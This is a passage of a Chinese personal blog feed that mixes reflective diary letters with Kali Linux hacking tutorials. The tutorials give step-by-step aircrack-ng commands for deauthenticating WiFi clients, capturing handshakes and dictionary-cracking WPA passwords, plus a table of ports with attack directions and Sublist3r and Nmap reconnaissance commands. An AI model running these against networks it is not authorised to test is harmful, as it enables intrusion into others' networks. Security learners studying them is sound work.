/strong></p><p><strong>致敬未知。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 书信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小柔书信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-Linux 暴力破解WiFi密码</title>
      <link href="/2021/09/28/kaliLinux_bursting-wifi/"/>
      <url>/2021/09/28/kaliLinux_bursting-wifi/</url>
      
        <content type="html"><![CDATA[<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p><strong>硬件设备</strong>：</p><blockquote><p>操作机器<br>无线渗透网卡 | 有线渗透网卡</p></blockquote><p><strong>软件</strong>：</p><blockquote><p>Kali Linux 系统 （我版本是 2021.1）<br>Aircrack-NG<br>爆破字典 （可以是 Kali Linux 自带的）<br>有 wifi 环境下</p></blockquote><hr><h3 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h3><p><strong>首先我们要建立监听热点环境机制</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 检查网卡是否连接成功,成功会看到 wlan0 出现</span></span><br><span class="line">ifconfig -a</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">  <span class="built_in">kill</span> 一切干扰无线网卡监听热点的信号</span></span><br><span class="line">airmon-ngcheck kill</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> wlan0是无线网卡的名称,载入网卡开启网络监听</span></span><br><span class="line">airmon-ng start wlan0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此时无线网卡的名称将变成 wlan0mon ,表示开启网络监听</span></span><br><span class="line">ifconfig -a</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 该操作是开始监听周围WiFi热点, 显示各个WiFi热点（ctrl C停止监听）</span></span><br><span class="line">airodump-ng wlan0mon</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 选取WiFi热点进行攻击, 该操作是抓包,当新建一个终端去攻击连接WiFi的设备掉线后，我们抓到的tcp包就是存储在/root/桌面这个路径上</span></span><br><span class="line">airodump-ng -c 频道(ch) --bssid bssid -w /root/桌面 (用来存储抓包的目录) 网卡名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个终端：键入下面代码</span></span><br><span class="line">aireplay-ng -0 0 -c 客户端MAX(STATION) -a bssid 网卡名 (一般为wlan0mon)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此时返回前一个终端,可看到抓到的tcp包,在头部位置</span></span><br><span class="line">WPA handshake :  bssid </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 暴力破解, 解压kali自带的字典文件  路径：/usr/share/wordlists/rockyou.txt.gz</span></span><br><span class="line">gzip -d/usr/share/wordlists/rockyou.txt.gz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开始爆破 aircrack-ng -w 字典路径（kali有自带的字典文件，解压路径为:/usr/share/wordlists/rockyou.txt） /root/桌面/桌面-01.cap（握手包）</span></span><br><span class="line">aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/桌面-0.1.cap</span><br><span class="line">aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 88:C3:97:31:E8:9D test-01.cap</span><br><span class="line">aircrack-ng -w &lt;指定字典&gt; -b &lt;目的路由MAC地址&gt; &lt;抓到的握手包&gt;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭网络监听</span></span><br><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用 crunch</span> </span><br><span class="line">crunch</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 10 10表示制作一个10位数的密码， 012表示密码中包含数字012xy这些元素，/root/12345.txt表示密码文本储存的路径以及名字</span></span><br><span class="line">crunch 10 10 012 xy&gt;&gt;/root/12345.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用aircrack-ng -w /root/12345.txt /root/<span class="built_in">cap</span>/er8-01.cap（ircrack-ng -w 字典路径 握手包路径） 进行wifi密码破解</span></span><br></pre></td></tr></table></figure><h3 id="原理流程介绍"><a href="#原理流程介绍" class="headerlink" title="原理流程介绍"></a>原理流程介绍</h3><p><strong>airepaly-ng -0 0 -c 客户端MAX(STATION) -a bssid 网卡名 (一般为wlan0mon) 代码解释</strong>:</p><blockquote><p>0为用deauth洪水攻击WiFi设备的次数，0为无限，-0 5则攻击5次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码<br>为什么要穷举，而不是直接从数据包里面获取密码？因为数据包里面的密码是哈希加密的，哈希加密只能正向，不能反向推导，所以需要一个个正向推导，直到找到正确的密码。</p></blockquote><blockquote><p>暴力破解就是穷举法，将密码字典中每一个密码依次去与握手包中的密码进行匹配，直到匹配成功。能否成功破解wifi密码取决于密码字典本身是否包含了这个密码。破解的时间取决于CPU的运算速度以及wifi密码本身的复杂程度。如果WiFi密码设得足够复杂，即使有一个好的密码字典，破解成功也可能要数小时甚至数天。</p></blockquote><p><strong>暴力破解思路</strong>:</p><blockquote><p>kali系统接入无线网卡，并通过里面的aircrack程序开始监听周围热点，选择一个WiFi热点，用aircrack去攻击一台连接了该WiFi热点的设备，使其掉线，之后这台设备（手机/电脑）肯定会再次自动来连接，我方利用伪装的挂载设备去接受设备（电脑/手机）发送的tcp三次握手数据包(里面包含了加密的WiFi密码)。此时我们只要用kali里面自带的密码字典文件去穷举该数据包，直到找到WiFi密码为止就成功了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-Linux 子域名 Sublist3r</title>
      <link href="/2021/09/25/kaliLinux-Subdomain-Sublist3r/"/>
      <url>/2021/09/25/kaliLinux-Subdomain-Sublist3r/</url>
      
        <content type="html"><![CDATA[<h2 id="Kali-Linux-子域名-Sublist3r"><a href="#Kali-Linux-子域名-Sublist3r" class="headerlink" title="Kali Linux 子域名 Sublist3r"></a>Kali Linux 子域名 Sublist3r</h2><blockquote><p><strong><code>注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规</code></strong></p></blockquote><p><code>Lali Linux 系列第四篇信息收集第三章 子域名 Sublist3r</code></p><blockquote><p><strong><code>从几个维度来收集子域名，使用软件进行目录扫描</code></strong></p></blockquote><h3 id="子域名收集的作用"><a href="#子域名收集的作用" class="headerlink" title="子域名收集的作用"></a>子域名收集的作用</h3><blockquote><ul><li>扩大渗透测试范围</li><li>找到目标站点突破口</li><li>业务边界安全</li></ul><p>当然泛解析域名是没有利用价值的</p></blockquote><p><strong>常见子域盲区</strong></p><blockquote><p><code>子域名打开就是404页面、403页面怎么做</code></p><p>案例：<strong>我们如何发现 ucweb.com 的两个 XSS</strong></p><p>示例：<a href="https://nosec.org/home/detail/2011.html">链接</a></p></blockquote><h3 id="收集子域名的方法"><a href="#收集子域名的方法" class="headerlink" title="收集子域名的方法"></a>收集子域名的方法</h3><ul><li><strong>在线收集子域名</strong></li></ul><blockquote><ul><li><strong>谷歌语法</strong></li></ul><p>通过特定站点的范围查询子域：site：baidu.com</p><ul><li><strong>在线爆破</strong></li></ul><p>在线枚举爆破：<a href="http://phpinfo.me/domain/">在线枚举爆破链接</a></p><ul><li><strong>证书搜索</strong></li></ul><p>基于 SSL 证书查询子域：<a href="https://crt.sh/">基于 SSL 证书查询链接</a></p><ul><li><strong>DNS 搜索</strong>（比较精准）</li></ul><p>基于 DNS 记录查询子域：<a href="https://dns.bufferover.run/dns?q=">基于 DNS 记录查询子域链接</a></p></blockquote><ul><li><strong>Fuzzdomain 工具</strong></li></ul><blockquote><p>使用 GitHub 下载相应的子域发现工具（根据文档记得安装依赖）</p></blockquote><figure class="highlight v"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/aboul3la/Sublist3r</span></span><br><span class="line"></span><br><span class="line"># 安装模块（当然它还有一些 DNS 的工具包，可以在说明文档看）</span><br><span class="line">sudo pip3 install -r requirements<span class="variable">.txt</span></span><br><span class="line"></span><br><span class="line"># 枚举目标子域</span><br><span class="line">python sublist3r<span class="variable">.py</span> -d aqlab<span class="variable">.cn</span></span><br><span class="line"></span><br><span class="line"># 枚举子域并且显示开发 <span class="number">80</span> 和 <span class="number">443</span> 端口的子域</span><br><span class="line">python sublist3r<span class="variable">.py</span> -d aqlab<span class="variable">.cn</span> -p <span class="number">80</span>,<span class="number">443</span></span><br><span class="line"></span><br><span class="line"># 枚举目标子域并保存</span><br><span class="line">python shublist3r<span class="variable">.py</span> -d aqlab<span class="variable">.cn</span> -o aqlab<span class="variable">.txt</span></span><br></pre></td></tr></table></figure><ul><li><strong>用户事件</strong></li></ul><blockquote><ul><li><strong>历史漏洞</strong></li></ul><p>乌云镜像：<a href="http://www.anquan.us/">乌云镜像链接</a></p><ul><li><strong>使用手册、通知</strong></li></ul><p>学院通知：<a href="http://dwz.cn/OOWeYYy6">示例链接</a></p></blockquote><hr><h3 id="使用御剑扫描敏感目录"><a href="#使用御剑扫描敏感目录" class="headerlink" title="使用御剑扫描敏感目录"></a>使用御剑扫描敏感目录</h3><blockquote><p><strong><code>御剑是一款很好用的网站后台扫描工具，图形化页面，使用起来简单上手</code></strong></p><p>下载：<a href="https://pan.baidu.com/s/1vkwZ390yS0yS2V07MhgECw">字典链接</a><br>下载：<a href="https://pan.baidu.com/s/1FAmb9EnuuJm2ogJ6BdYkTg">御剑系列链接</a><br>提取码：YJXZ</p></blockquote><p><strong>字典查询</strong></p><blockquote><p>弱口令100</p><p>Web目录字典  - 域名字典</p></blockquote><h3 id="robots-txt-文件的作用"><a href="#robots-txt-文件的作用" class="headerlink" title="robots.txt 文件的作用"></a>robots.txt 文件的作用</h3><blockquote><p><strong>Robits协议</strong></p><p>（也叫爬虫协议、机器人协议等）全称是 “ 网络爬虫排除标准 ” （Robots Exclusion Protocol）,网站通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p></blockquote><blockquote><p><strong>Robots.txt 文件的重要性</strong></p><p>Robots.txt 是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据 Robots.txt 文件的内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减少搜索引擎蜘蛛的工作量。</p></blockquote><blockquote><p><strong>Robots.txt 文件的存放位置</strong></p><p>网站根目录下，通过 “ 域名/robots.txt0 ” 能正常访问即可，如：http://域名/robots.txt</p></blockquote><p><strong>Robots写法</strong>：<a href="https://baijiahao.baidu.com/s?id=1616368344109675728&wfr=spider&for=pc">链接</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【無憂樹洞】那些片段里的心绪与渴望</title>
      <link href="/2021/09/22/epistle.2021.9.22.01/"/>
      <url>/2021/09/22/epistle.2021.9.22.01/</url>
      
        <content type="html"><![CDATA[<p>紫霞说，她在等她的齐天大圣，踩着七彩祥云，从天而降。</p><p>我有一个片段，某个人，从天而降，有没有七彩祥云不重要，重要的是，他的眼里有我，望着我，目光温柔而笃定，然后冲我勾勾手指，笃定的吐出三个字“跟我走”，没有勉强，也不容抗拒。哈哈。。。曾经我有一个心理咨询师，在跟他简短的聊了几句之后，我就决定找他做咨询了，他的声音里藏着这样的气质“跟我走”，适合我这样的没有方向的人，哈哈。</p><p>后来的后来，我一直在想，我该自己找到自己的方向，即便没有方向，也需要自己上路。</p><p>突然想起一个记忆的片段，我已经忘记了那个男人的名字，样貌，但是我记得，他牵着我的手，走在我的前面，提着我的行李，带我穿过拥挤的人群。一个属羊的温柔的男人，那个瞬间，我是喜欢他的。</p><p>我时常“看见”这样一个画面，在一片绿油油的草地上，一个蹒跚走路的小女孩，顾自在玩儿，那是她对世界的一种探索吧，也许偶然之间，她发现了一片特别的叶子，一块可爱的石头，然后她拿着自己的胜利品，回头，望向她的爸爸，爸爸宠溺的看着他，目光温柔，满眼都是赞许和鼓励，在这样的眼神和笑容里，小姑娘满足的顾自继续玩耍。</p><p>类似的情景，现在时常发现在我和儿子的场景中，他会跟我炫耀他的游戏成果，他的作品，有时候会希望我看他打游戏。在小孩子的世界中，他自己是很厉害的。</p><p>只是我发现，这对我来说，也是困难的。我们要从一个我们从未习得的部分，去习得爱与温柔，坚定与力量。</p><p>曾经我遇到过一个人类图的解读师，我是只有1%人群的反映者，是很好的管道特质，她带我去认识了她背后的“组织”，我在某个场域中，深深的感受到一种更宏大的力量，有一种眼泪是饱含故乡、回家。 不过他们的领导人表示，我和他们不是一路人。</p><p>我们总是会有机缘，遇见各种各样的人，圈子，人的社会化属性，对于同类总是会有深深的渴望。</p><p>也许意识上，已经知晓天人本一，也已经知晓我们本无任何差别，宇宙与我们，不过是人体与头发丝的关系，每一根头发丝都携带着人体全部的DNA信息。所有的不同的人，仿佛都来自同一个父母的基因，我们都是近亲。我们也深刻的知晓，我们都是有“父母”生养的人，但是我依然会有一种从未见过“父母”的样貌的孤儿的感觉。在这虚空之中，有时候我们可以感受到那种全然的爱，来自“父母”这宇宙之爱。</p><p>我总是“看见”各种战争的画面，遍地残骸，尸横遍野，有一些战争在人类的战场，有一些战争并不在地球之上。</p><p>总有一个虚空的存在，如同宇宙的深处，无穷尽的黑暗，无穷尽的空间，只是在那样的空间飘荡，全然的放松与存在，我享受那样纯粹的存在。那样的感觉一点也不恐怖，而是熟悉的安心的，仿佛我们就来自这样的虚空，又归于这样的虚无。</p><p>男人在性爱之中，总是想要去征服，进入女人的身体，仿佛就是一种征服，在意识被生理接管的时候，头脑和内心被征服的胜利的满足感，成就感充斥。在意识模糊的时候，总有一些言语，会直接通往潜意识的深处。每个人，不同。有些人，需要胜利，需要征服；有些人需要爱；有些人需要某些特殊的关系；有些人需要其他。你需要什么？</p><p>我时常陷入“要我”的迷思，我时常被“我要你”俘虏。这种要和被要，通向潜意识的什么意图？我一直知道，那里还有一座未探索的迷宫。</p><p>你有什么理想？</p><p>有人告诉我，有一份安稳的工作，有不错的收入，结婚，生孩子，然后就像王子和公主一样过着幸福的生活。</p><p>为你的理想干杯，致敬你的理想。理想没有什么好不好，高尚不高尚，只要它会成为某种方向，在召唤你，在让你为之而努力，就很好。</p><p>我很仔细的想了想，我的理想是什么。我以前很喜欢看超女，看最强大脑，我觉得他们有理想，有追求。我没有那种东西。</p><p>我想了想，我唯一可以称之为理想的念头，种子，大概就是，我本来想说普度众生，哈哈，可是没有什么人是需要度的呀，我们唯一需要度的只有自己，所有的人都是来度我们自己的。所以我的理想，大概就只是度我自己吧。可是我的理想，并没有为我带来方向和动力，所以我想，我的理想，还不足以称为理想吧，大概只是一颗还没有种下去的种子，还没有发芽。</p><p>这是一个值得探索和研究的问题，我已经探索了很久很久。</p><p>曾经我以为，我应该要找到某个地方，然后去远行。走了很久很久之后，才知道，我们要找的东西，根本不在一个叫远方的地方，也没有什么别的东西需要去寻找，也没有什么别的东西，需要去求索。如果本自具足，我们就根本不缺什么，也没有什么需要寻找和求索的。</p><p>难道，我们缺的就只是信任？全然的相信？</p><p>应该不是的。</p><p>我们像积满了厚厚的灰尘的钻石，使它看起来一点都不像钻石。我们除了相信它原本就是钻石，还需要一点点把那些灰尘拭去，然后某天终于会印证这本就是钻石吗。</p><hr><p><strong>我只是在呢喃自语，</strong></p><p><strong>如果你看了，就已经是一种见证和陪伴了，</strong></p><p><strong>因为我知道一定会有人看。</strong></p><p><strong>如果有什么信息能和你共鸣，</strong></p><p><strong>你从中看见了自己，</strong></p><p><strong>那就是另外的收获了。</strong></p><p><strong>如果你看懂了，</strong></p><p><strong>你从中看见了我，</strong></p><p><strong>还能有什么回应，</strong></p><p><strong>并且这回应我们还可以彼此共振，</strong></p><p><strong>那就是更大的惊喜了。</strong></p><p><strong>没有无缘无故的遇见。</strong></p><p><strong>致敬未知。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 书信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小柔书信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-Linux 攻击路线图</title>
      <link href="/2021/09/21/kali-LinuxAttacks01/"/>
      <url>/2021/09/21/kali-LinuxAttacks01/</url>
      
        <content type="html"><![CDATA[<h2 id="Kali-Linux-攻击路线图"><a href="#Kali-Linux-攻击路线图" class="headerlink" title="Kali Linux 攻击路线图"></a>Kali Linux 攻击路线图</h2><blockquote><p><strong><code>注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规</code></strong></p></blockquote><h3 id="Web-应用服务"><a href="#Web-应用服务" class="headerlink" title="Web 应用服务"></a>Web 应用服务</h3><table><thead><tr><th><strong>端口号</strong></th><th><strong>端口说明</strong></th><th><strong>攻击方向</strong></th></tr></thead><tbody><tr><td>80 / 443 / 8080</td><td>常见 Web 服务端口</td><td>Web 攻击、爆破、对应服务器版本漏洞</td></tr><tr><td>7001 / 7002</td><td>Weblogic 控制台</td><td>Java 反序列化 、弱口令</td></tr><tr><td>8080 / 8089</td><td>Jboss / Resin?Jetty / Jenkins</td><td>反序列化、控制台弱口令</td></tr><tr><td>9090</td><td>WebShphere 控制台</td><td>Java反序列化、弱口令</td></tr><tr><td>4848</td><td>GlassFish 控制台</td><td>弱口令</td></tr><tr><td>1352</td><td>Lotus domino 邮件服务</td><td>弱口令、信息泄露、爆破</td></tr><tr><td>10000</td><td>Webmin-Web 控制面板</td><td>弱口令</td></tr></tbody></table><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><table><thead><tr><th><strong>端口号</strong></th><th><strong>端口说明</strong></th><th><strong>攻击方向</strong></th></tr></thead><tbody><tr><td>22</td><td>SSH 远程连接</td><td>爆破、SSH 隧道及内网代理转发、文件传输</td></tr><tr><td>23</td><td>Teinet 远程连接</td><td>爆破、嗅探、弱口令</td></tr><tr><td>3389</td><td>Rdp 远程桌面连接</td><td>Shift 后门（Win server 2003 以下系统）、爆破</td></tr><tr><td>5900</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>5632</td><td>PyAnywhere 服务</td><td>抓密码、代码执行</td></tr></tbody></table><h3 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h3><table><thead><tr><th><strong>端口号</strong></th><th><strong>端口说明</strong></th><th><strong>攻击方向</strong></th></tr></thead><tbody><tr><td>21 / 22 / 69</td><td>Ftp/TFtp 文件传输协议</td><td>匿名上传、下载、爆破和嗅探</td></tr><tr><td>2049</td><td>NFS 服务</td><td>配置不当</td></tr><tr><td>139</td><td>Samba 服务</td><td>爆破、未授权访问、远程代码执行</td></tr><tr><td>389</td><td>Ldap 目录访问协议</td><td>注入允许、匿名访问、弱口令</td></tr></tbody></table><h3 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h3><table><thead><tr><th><strong>端口号</strong></th><th><strong>端口说明</strong></th><th><strong>攻击方向</strong></th></tr></thead><tbody><tr><td>3306</td><td>MySQL</td><td>注入、提权、爆破</td></tr><tr><td>1433</td><td>MsSQL 数据库</td><td>注入、提权、SA 弱口令、爆破</td></tr><tr><td>1521</td><td>Oracle 数据库</td><td>TNS 爆破、注入、反弹 Shell</td></tr><tr><td>5432</td><td>PostgreSQL</td><td>爆破、注入、弱口令</td></tr><tr><td>27017 / 27018</td><td>MongoDB</td><td>爆破、未授权访问</td></tr><tr><td>6379</td><td>Redis 数据库</td><td>可尝试未授权访问、弱口令、爆破</td></tr><tr><td>5000</td><td>SysBase / DB2 数据库</td><td>爆破、注入</td></tr></tbody></table><h3 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h3><table><thead><tr><th><strong>端口号</strong></th><th><strong>端口说明</strong></th><th><strong>攻击方向</strong></th></tr></thead><tbody><tr><td>25</td><td>SMTP 邮件服务</td><td>邮件伪造</td></tr><tr><td>110</td><td>POP3 协议</td><td>爆破、嗅探</td></tr><tr><td>143</td><td>IMAP 协议</td><td>爆破</td></tr></tbody></table><h3 id="网络常见协议"><a href="#网络常见协议" class="headerlink" title="网络常见协议"></a>网络常见协议</h3><table><thead><tr><th><strong>端口号</strong></th><th><strong>端口说明</strong></th><th><strong>攻击方向</strong></th></tr></thead><tbody><tr><td>53</td><td>DNS 域名系统</td><td>允许区域传送、DNS 劫持、缓存投毒、欺骗</td></tr><tr><td>67 / 68</td><td>DHCP 服务</td><td>劫持、欺骗</td></tr><tr><td>161</td><td>SNMP 协议</td><td>爆破、搜集目标内网信息</td></tr></tbody></table><h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3><table><thead><tr><th><strong>端口</strong></th><th><strong>端口说明</strong></th><th><strong>攻击方向</strong></th></tr></thead><tbody><tr><td>2181</td><td>Zookeeper 服务</td><td>未授权访问</td></tr><tr><td>8069</td><td>Zabbix 服务</td><td>远程执行、SQL 注入</td></tr><tr><td>9200 / 9300</td><td>Elastcsearch 服务</td><td>远程执行</td></tr><tr><td>11211</td><td>Memcache 服务</td><td>未授权访问</td></tr><tr><td>512 / 513 / 514</td><td>Linux Rexec 服务</td><td>爆破、Rlogin 登陆</td></tr><tr><td>873</td><td>Rsync 服务</td><td>匿名访问、文件上传</td></tr><tr><td>6390</td><td>Svn 服务</td><td>Svn 泄露、未授权访问</td></tr><tr><td>50000</td><td>SAPManagement Console</td><td>远程代码执行</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
          <category> 网安知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-Linux Nmap 端口扫描</title>
      <link href="/2021/09/21/kali-LinuxPortScanning-Nmap/"/>
      <url>/2021/09/21/kali-LinuxPortScanning-Nmap/</url>
      
        <content type="html"><![CDATA[<h2 id="Kali-Linux-Nmap-端口扫描"><a href="#Kali-Linux-Nmap-端口扫描" class="headerlink" title="Kali Linux Nmap - 端口扫描"></a>Kali Linux Nmap - 端口扫描</h2><blockquote><p><strong><code>注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规</code></strong></p></blockquote><p><code>Lali Linux 系列第四篇信息收集第二章 Nmap 端口扫描</code></p><h3 id="Nmap-简介"><a href="#Nmap-简介" class="headerlink" title="Nmap 简介"></a>Nmap 简介</h3><hr><blockquote><p>Nmap （” Network Mapper（网络映射器）”）是一款开放源代码的网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。Nmap 以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些主机提供什么服务（应用程序名和版本），那些服务运行在什么操作系统（包括版本信息），它们使用什么类型的报文过滤器 | 防火墙，以及一堆其他功能。虽然 Nmap 通常用于安全审核，许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息，管理服务升级计划，以及监视主机和服务的运行。</p></blockquote><p><strong>Nmap 官网</strong>：<a href="www.nmap.org">网址</a></p><hr><h4 id="Nmap-的作用"><a href="#Nmap-的作用" class="headerlink" title="Nmap 的作用"></a>Nmap 的作用</h4><blockquote><ul><li>检测存活在网络上的主机（主机发现）</li><li>检测主机上开放的端口（端口发现或枚举）</li><li>检测到相应的端口（服务发现）的软件和版本</li><li>检测操作系统，硬件地址，以及软件版本</li><li>检测脆弱性的漏洞（Nmap 的脚本）</li></ul></blockquote><hr><h3 id="Nmap-常用扫描指令"><a href="#Nmap-常用扫描指令" class="headerlink" title="Nmap 常用扫描指令"></a>Nmap 常用扫描指令</h3><p><strong>常用的端口扫描指令</strong>：</p><blockquote><p>-sS：TCP SYN扫描</p><p>-sU：UDP扫描</p><p>-sT：TCP扫描</p><p>-sV：扫描系统版本和程序版本号检测</p><p>-sn：只进行主机发现，使用ping扫描来侦测存活主机不进行端口扫描</p><p>-sV：扫描版本号侦测，检测开放端口来判断开放服务，并检测其版本</p><p>-sR：RCP扫描 扫描是否为 PRC 端口，存在 PRC 端口则返回程序和版本号</p><p>-sP：Ping 扫描</p><p>-P0；-Pn：无 Ping 扫描</p><p>-PS：TCP SYN Ping 扫描</p><p>-PA：TCP ACK Ping扫描</p><p>-PU：UDP Ping 扫描</p><p>-PE；-PP；-PM：ICMP Ping Types扫描</p><p>-PR：ARP Ping 扫描</p><p>-p：指定端口号扫描</p><p>-PR：ARP ping 扫描 通常在局域网扫描，使用地址解析协议，本地局域网不会禁止 ARP 请求</p><p>-sL：列表扫描，列出指定网络上的每台主机，默认使用域名解析获取他们的名字</p><p>-v：显示扫描过程</p><p>-w：结果的详细输出</p><p>-F：快速扫描</p><p>-n：禁止反向域名解析</p><p>-R：反向域名解析</p><p>-6：启动 IPV6 扫描</p><p>-o：启动系统探测</p><p>-Pn：禁止ping后扫描：跳过主机发现的过程进行端口扫描</p><p>-A：全面的系统扫描：包括打开操作系统探测、版本探测、脚本扫描、路径扫描</p><p>–scrpt=vuln：全面的漏洞扫描</p><p>–allports：全端口版本探测 启用全端口版本扫描，会跳过9100 TCP 段 只有使用 –allports 才能扫描所有的端口</p><p>–version-intensity：扫描强度设置 扫描强度为 0-9 ，默认为7，最低为0，最高为9</p><p>-system-dns：系统域名解析器，通过直接发送查询到主机上自带配置的域名服务器来解析域名</p><p>-traceroute：路由跟踪，帮助用户了解网络情况，可以查出本地计算机到目标之间所经过的网络节点，并可以看到通过各个节点的时间</p><p>-PY：SCTP INIT Ping扫描 通过 STCP 协议进行扫描主机</p><p>–version-trace：获取详细版本信息 对获取目标主机的额外信息有帮助</p><p>–osscan-guess；–fuzzy：探测系统识别 当 nmap 无法准确识别系统时，我们可以用这两个参数进行大胆的尝试猜测系统</p></blockquote><p><strong>扫描指定IP开放端口</strong>：</p><blockquote><p>nmap -sS -p &lt;端口号&gt; -v 192.168.1.2</p><p>使用半开扫描，指定端口号1-65535，显示扫描过程</p></blockquote><p><strong>穿透防火墙扫描</strong>：</p><blockquote><p>nmap -Pn -A 192.168.1.2</p><p>服务器禁止ping命令，试一试 -Pn，nmap参数配合使用</p></blockquote><p><strong>保存结果到文件</strong>：</p><blockquote><p>-Og &lt;文件名&gt;</p></blockquote><p><strong>漏洞扫描</strong>：</p><blockquote><p>nmap -script=vuln 192.168.1.2</p><p>使用 vuln 脚本进行全面的漏洞扫描</p></blockquote><p><strong>指纹识别扫描</strong>：</p><blockquote><p>nmap -sV -v 192.168.1.2</p><p>扫描系统和程序版本号检测，并输出详细信息</p></blockquote><blockquote><p>在 Root 用户下，直接使用 nmap 目标 启用了 -sS 扫描模式</p><p>nmap -p 80-81 192.168.1.2 选择范围扫描</p><p>nmap -p 80-81 -Pn 192.168.1.2 穿透防火墙扫描</p><p>nmap -p 80-81 -Pn -v 192.168.1.2 显示扫描全过程 </p><p>nmap -A -Pn  192.168.1.2 全局扫描</p></blockquote><h3 id="Nmap-扫描状态"><a href="#Nmap-扫描状态" class="headerlink" title="Nmap 扫描状态"></a>Nmap 扫描状态</h3><blockquote><p>Opend：端口开启</p><p>Closed：端口关闭</p><p>Filtered：端口被过滤，数据没有到达主机，返回结果为空，数据被防火墙</p><p>Unfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态</p><p>Open | filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL 和 Xmas 扫描中</p><p>Closed | filtered：关闭或者被过滤，只发生在IP ID idle 扫描</p></blockquote><p><strong>CVE</strong>:</p><blockquote><p><a href="http://cve.scap.org.cn/">http://cve.scap.org.cn/</a></p><p><a href="http://cve.mitre.org/">http://cve.mitre.org/</a></p><p>信息安全漏洞查询库：我们可以将检测的漏洞编号收集在这里去验证</p></blockquote><h3 id="Nmap-漏洞扫描"><a href="#Nmap-漏洞扫描" class="headerlink" title="Nmap 漏洞扫描"></a>Nmap 漏洞扫描</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><blockquote><p>使用 Nmap 中的脚本进行信息收集</p></blockquote><p><strong>whois 信息收集</strong></p><blockquote><p>脚本名称：whois-domain.nse</p><p>使用方法：nmap –script whois-domain.nse &lt;目标&gt;</p><p>查询目标 whois 信息</p></blockquote><p><strong>DNS 解析查询</strong></p><blockquote><p>脚本名称：dns-brute</p><p>使用方法：nmap –script dns-brute &lt;目标&gt;</p><p>通过 DNS 记录进行查询并且进行爆破</p></blockquote><p><strong>扫描 WEB 漏洞</strong></p><blockquote><p>脚本名称：http:stored-xss.nse</p><p>使用方法：nmap –script http:stored-xss.nse &lt;目标&gt;</p><p>扫描目标是否存在 xss 漏洞</p><p>还有很多 web 扫描脚本</p></blockquote><p><strong>检测 MySQL 密码</strong></p><blockquote><p> 脚本名称：mysql-empty-password</p><p>使用方法：nmap –scirpt=mysql-empty-password 